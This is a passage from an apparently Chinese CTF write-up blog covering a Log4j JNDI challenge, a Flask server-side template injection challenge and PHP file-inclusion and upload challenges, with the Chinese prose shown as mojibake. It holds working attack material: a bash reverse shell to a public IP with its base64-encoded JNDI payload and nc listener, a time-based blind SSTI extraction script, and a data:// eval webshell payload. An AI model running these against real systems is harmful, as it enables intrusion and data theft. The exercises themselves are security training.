class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[root@iZbp1cdkjx3v4aulod8zk9Z yiyi]<span class="comment"># java -jar JNDIExploit-1.2-SNAPSHOT.jar -h</span></span><br><span class="line">Usage: java -jar JNDIExploit-1.2-SNAPSHOT.jar [options]</span><br><span class="line">  Options:</span><br><span class="line">  * -i, --ip       Local ip address</span><br><span class="line">    -l, --ldapPort Ldap <span class="built_in">bind</span> port (default: 1389)</span><br><span class="line">    -p, --httpPort Http <span class="built_in">bind</span> port (default: 8080)</span><br><span class="line">    -u, --usage    Show usage (default: <span class="literal">false</span>)</span><br><span class="line">    -h, --<span class="built_in">help</span>     Show this <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">[root@iZbp1cdkjx3v4aulod8zk9Z yiyi]<span class="comment"># java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</span></span><br><span class="line">Supported LADP Queriesï¼š</span><br><span class="line">* all words are <span class="keyword">case</span> INSENSITIVE when send to ldap server</span><br><span class="line"></span><br><span class="line">[+] Basic Queries: ldap://null:1389/Basic/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://null:1389/Basic/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/Basic/Command/[cmd]</span><br><span class="line">    ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/Basic/TomcatEcho</span><br><span class="line">    ldap://null:1389/Basic/SpringEcho</span><br><span class="line">    ldap://null:1389/Basic/WeblogicEcho</span><br><span class="line">    ldap://null:1389/Basic/TomcatMemshell1</span><br><span class="line">    ldap://null:1389/Basic/TomcatMemshell2  ---need extra header [shell: <span class="literal">true</span>]</span><br><span class="line">    ldap://null:1389/Basic/JettyMemshell</span><br><span class="line">    ldap://null:1389/Basic/WeblogicMemshell1</span><br><span class="line">    ldap://null:1389/Basic/WeblogicMemshell2</span><br><span class="line">    ldap://null:1389/Basic/JBossMemshell</span><br><span class="line">    ldap://null:1389/Basic/WebsphereMemshell</span><br><span class="line">    ldap://null:1389/Basic/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] Deserialize Queries: ldap://null:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://null:1389/Deserialization/URLDNS/[domain]</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/Deserialization/CommonsBeanutils2/TomcatEcho</span><br><span class="line">    ldap://null:1389/Deserialization/C3P0/SpringEcho</span><br><span class="line">    ldap://null:1389/Deserialization/Jdk7u21/WeblogicEcho</span><br><span class="line">    ldap://null:1389/Deserialization/Jre8u20/TomcatMemshell</span><br><span class="line">    ldap://null:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1</span><br><span class="line">    ldap://null:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells</span><br><span class="line"></span><br><span class="line">[+] TomcatBypass Queries</span><br><span class="line">    ldap://null:1389/TomcatBypass/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/TomcatBypass/Command/[cmd]</span><br><span class="line">    ldap://null:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/TomcatBypass/TomcatEcho</span><br><span class="line">    ldap://null:1389/TomcatBypass/SpringEcho</span><br><span class="line">    ldap://null:1389/TomcatBypass/TomcatMemshell1</span><br><span class="line">    ldap://null:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: <span class="literal">true</span>]</span><br><span class="line">    ldap://null:1389/TomcatBypass/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] GroovyBypass Queries</span><br><span class="line">    ldap://null:1389/GroovyBypass/Command/[cmd]</span><br><span class="line">    ldap://null:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line"></span><br><span class="line">[+] WebsphereBypass Queries</span><br><span class="line">    ldap://null:1389/WebsphereBypass/List/file=[file or directory]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/Dnslog/[domain]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/Command/[cmd]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://null:1389/WebsphereBypass/Upload/WebsphereMemshell</span><br><span class="line">    ldap://null:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</span><br><span class="line">[root@iZbp1cdkjx3v4aulod8zk9Z yiyi]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>å…ˆå°†åå¼¹shellçš„å‘½ä»¤base64ç¼–ç ï¼Œç„¶åå°†é‡Œé¢çš„+å·å’Œ&#x3D;å·è¿›è¡Œä¸€æ¬¡urlç¼–ç </p>
<p>æ³¨ï¼šIPå¡«vpså…¬ç½‘ipï¼ŒPORTè¦å’Œncç›‘å¬çš„ç«¯å£å¯¹åº”</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/IP/</span><span class="variable constant_">PORT</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/101.37.27.18/</span><span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment"># =&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx</span></span><br><span class="line"><span class="comment"># =&gt; YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯åŠ¨JNDIExploit</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDIExploit-1.2-SNAPSHOT.jar </span>-i <span class="number">101</span>.<span class="number">37</span>.<span class="number">27</span>.<span class="number">18</span> -l <span class="number">1389</span> -p <span class="number">8180</span></span><br></pre></td></tr></table></figure>

<p>ç”¨ncç›‘å¬ç«¯å£</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://101.37.27.18:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx&#125;</span><br></pre></td></tr></table></figure>

<p>ç»ˆç«¯1</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807201100972.png" alt="image-20240807201100972"></p>
<p>ç»ˆç«¯2</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807201111841.png" alt="image-20240807201111841"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807201133456.png" alt="image-20240807201133456"></p>
<h2 id="å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰"><a href="#å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰" class="headerlink" title="å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰"></a>å‡»å‰‘æ¯-è¿‘åœ¨çœ¼å‰</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app,</span><br><span class="line">    key_func=get_remote_address,</span><br><span class="line">    default_limits=[<span class="string">&quot;10000 per hour&quot;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5/second&quot;</span>, override_defaults=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&quot;\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e&quot;</span>)%<span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5/second&quot;</span>, override_defaults=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&quot;/app/flag.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        query = request.args[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">        render_template_string(query)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Thank you for your input.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;No input found.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>å‘ç°Flask åº”ç”¨çš„ <code>check</code> è·¯ç”±å­˜åœ¨å®‰å…¨æ¼æ´ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5/second&quot;</span>, override_defaults=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&quot;/app/flag.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read().strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        query = request.args[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">        render_template_string(query)  <span class="comment"># æ­¤å¤„å­˜åœ¨ SSTI æ¼æ´</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Thank you for your input.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;No input found.&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>render_template_string(query)</code> å‡½æ•°ç›´æ¥æ¸²æŸ“äº†ç”¨æˆ·æä¾›çš„è¾“å…¥ï¼ˆ<code>query</code>ï¼‰ï¼Œå¯¼è‡´å­˜åœ¨ SSTI æ¼æ´ã€‚</p>
<p><code>render_template_string</code> æ˜¯ Flask æä¾›çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†æ¨¡æ¿å­—ç¬¦ä¸²æ¸²æŸ“ä¸ºæœ€ç»ˆçš„ HTML è¾“å‡ºã€‚å®ƒç±»ä¼¼äº <code>render_template</code>ï¼Œä½†åŒºåˆ«åœ¨äº <code>render_template</code> æ˜¯ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œè€Œ <code>render_template_string</code> æ˜¯ç›´æ¥æ¸²æŸ“ä¼ é€’ç»™å®ƒçš„å­—ç¬¦ä¸²ã€‚</p>
<h3 id="render-template-string-çš„å·¥ä½œåŸç†"><a href="#render-template-string-çš„å·¥ä½œåŸç†" class="headerlink" title="render_template_string çš„å·¥ä½œåŸç†"></a><code>render_template_string</code> çš„å·¥ä½œåŸç†</h3><p><code>render_template_string</code> ä¼šå°†ä¼ é€’ç»™å®ƒçš„æ¨¡æ¿å­—ç¬¦ä¸²ä¸ä¸Šä¸‹æ–‡å˜é‡è¿›è¡Œç»“åˆï¼Œç„¶åä½¿ç”¨ Jinja2 æ¨¡æ¿å¼•æ“æ¥æ¸²æŸ“å­—ç¬¦ä¸²å¹¶ç”Ÿæˆæœ€ç»ˆçš„ HTML è¾“å‡ºã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">    name = request.args[<span class="string">&quot;input&quot;</span>]</span><br><span class="line">    template = <span class="string">&quot;Hello, &#123;&#123; name &#125;&#125;!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>render_template_string</code> å‡½æ•°å°†å­—ç¬¦ä¸² <code>&quot;Hello, &#123;&#123; name &#125;&#125;!&quot;</code> ä¸ä¸Šä¸‹æ–‡å˜é‡ <code>name</code> ç»“åˆ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807225003690.png" alt="image-20240807225003690"></p>
<h3 id="å¦‚ä½•å¯¼è‡´-SSTI-æ¼æ´"><a href="#å¦‚ä½•å¯¼è‡´-SSTI-æ¼æ´" class="headerlink" title="å¦‚ä½•å¯¼è‡´ SSTI æ¼æ´"></a>å¦‚ä½•å¯¼è‡´ SSTI æ¼æ´</h3><p>å½“ç”¨æˆ·è¾“å…¥ç›´æ¥ä¼ é€’ç»™ <code>render_template_string</code> è€Œä¸è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–éªŒè¯æ—¶ï¼Œå°±å¯èƒ½å¼•å‘æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    user_input = request.args.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(user_input)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>user_input</code> ç›´æ¥æ¥è‡ªç”¨æˆ·è¯·æ±‚å‚æ•°ï¼Œå¹¶è¢«ä¼ é€’ç»™ <code>render_template_string</code>ã€‚å¦‚æœç”¨æˆ·ä¼ é€’ä¸€ä¸ªæ¶æ„çš„æ¨¡æ¿è¡¨è¾¾å¼ä½œä¸ºè¾“å…¥ï¼Œå°±å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssti?input=&#123;&#123; 7*7 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ç§è¯·æ±‚ä¼šå¯¼è‡´ Flask æ¸²æŸ“æ¨¡æ¿å­—ç¬¦ä¸² <code>&#123;&#123; 7*7 &#125;&#125;</code>ï¼Œå¹¶è¿”å›ç»“æœ <code>49</code>ã€‚</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807225109328.png" alt="image-20240807225109328"></p>
<p>æ›´ä¸¥é‡çš„ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssti?input=&#123;&#123; &quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¯·æ±‚åˆ©ç”¨äº† Jinja2 æ¨¡æ¿çš„å¼ºå¤§åŠŸèƒ½ï¼Œè°ƒç”¨ Python çš„å†…ç½®å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¯èƒ½ä¼šæš´éœ²æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<h3 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h3><p>ä¸ºäº†é˜²æ­¢ SSTI æ¼æ´ï¼Œåº”é¿å…ç›´æ¥æ¸²æŸ“ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p>
<ol>
<li><strong>è¾“å…¥éªŒè¯å’Œæ¸…ç†</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ã€‚</li>
<li><strong>é¿å…ç›´æ¥æ¸²æŸ“ç”¨æˆ·è¾“å…¥</strong>ï¼šå°½é‡ä¸è¦å°†ç”¨æˆ·è¾“å…¥ç›´æ¥ä¼ é€’ç»™ <code>render_template_string</code>ã€‚</li>
<li><strong>ä½¿ç”¨æ²™ç®±ç¯å¢ƒ</strong>ï¼šå¦‚æœå¿…é¡»æ¸²æŸ“ç”¨æˆ·æä¾›çš„æ¨¡æ¿ï¼Œè€ƒè™‘ä½¿ç”¨æ²™ç®±ç¯å¢ƒæ¥é™åˆ¶æ¨¡æ¿çš„åŠŸèƒ½ã€‚</li>
</ol>
<h3 id="ä¾‹å­ï¼š"><a href="#ä¾‹å­ï¼š" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h3><p>é˜²æ­¢ SSTI çš„ä¸€ç§æ–¹æ³•æ˜¯å°†ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ä¼šè¢«è§£æä¸ºæ¨¡æ¿è¡¨è¾¾å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, escape</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/safe_ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_ssti</span>():</span><br><span class="line">    user_input = request.args.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    safe_input = escape(user_input)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;User input: &#123;&#123; input &#125;&#125;&quot;</span>, <span class="built_in">input</span>=safe_input)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>escape</code> å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰ï¼Œç¡®ä¿å®ƒä½œä¸ºæ™®é€šå­—ç¬¦ä¸²è€Œä¸æ˜¯æ¨¡æ¿è¡¨è¾¾å¼è¿›è¡Œæ¸²æŸ“ã€‚</p>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">char_set = <span class="string">&quot;1234567890abcdef-&quot;</span></span><br><span class="line">sess = req.session()</span><br><span class="line">flag = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char_set:</span><br><span class="line">        url = <span class="string">r&quot;&quot;&quot;http://045c5218-6cbf-40a3-a131-718130bef6d9.challenge.ctf.show/ssti?input=&#123;&#123;lipsum.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;if [ `cut -c %d /app/flag.txt` = \&quot;%s\&quot; ];then sleep 2;fi&#x27;).read()&quot;)&#125;&#125;&quot;&quot;&quot;</span> % (i, c)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        resp = sess.get(url)</span><br><span class="line">        <span class="keyword">if</span> resp.elapsed.seconds &gt;= <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(c, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag[i] = c</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="å•èº«æ¯webç­¾åˆ°"><a href="#å•èº«æ¯webç­¾åˆ°" class="headerlink" title="å•èº«æ¯webç­¾åˆ°"></a>å•èº«æ¯webç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dataåè®®åï¼Œphpæ ‡è®°?&gt;é—­åˆåå¯ä»¥åŠ ä»»æ„å­—ç¬¦ã€‚</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807231322397.png" alt="image-20240807231322397"></p>
<p>åˆ°è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°phpä»£ç å·²ç»æ‰§è¡Œï¼Œåé¢çš„å·²ç»è¢«?&gt;æ‰€æˆªæ–­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807231420222.png" alt="image-20240807231420222"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;nl /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240807231459137.png" alt="image-20240807231459137"></p>
<h2 id="GHCTF-2024-PermissionDenied"><a href="#GHCTF-2024-PermissionDenied" class="headerlink" title="[GHCTF 2024]PermissionDenied"></a>[GHCTF 2024]PermissionDenied</h2><p>é¢˜ç›®æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;pHp&quot;</span>,<span class="string">&quot;pHp5&quot;</span>,<span class="string">&quot;pHp4&quot;</span>,<span class="string">&quot;pHp3&quot;</span>,<span 